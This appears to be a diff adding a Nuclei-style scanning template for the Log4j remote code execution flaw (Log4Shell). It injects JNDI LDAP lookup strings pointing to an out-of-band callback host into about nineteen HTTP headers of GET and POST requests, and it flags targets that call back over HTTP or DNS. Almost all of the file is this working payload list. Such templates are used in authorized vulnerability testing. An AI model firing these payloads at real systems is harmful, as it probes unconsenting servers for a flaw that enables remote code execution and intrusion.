@@ -1,0 +1,55 @@
+id: log4j-fuzz-head-poc
+
+info:
+  name: log4j-rce漏洞
+  author: xxx
+  severity: critical
+  tags: apache,rce
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+    payloads:
+      log4j_payloads:
+        - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Remote-IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Remote-Addr: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'User-Agent: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'Referer: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'CF-Connecting_IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'True-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'Originating-IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Real-IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'Forwarded: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'Contact: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Wap-Profile: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Api-Version: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'Host: ${jndi:ldap://{{interactsh-url}}/info}'
+                
+    attack: clusterbomb
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
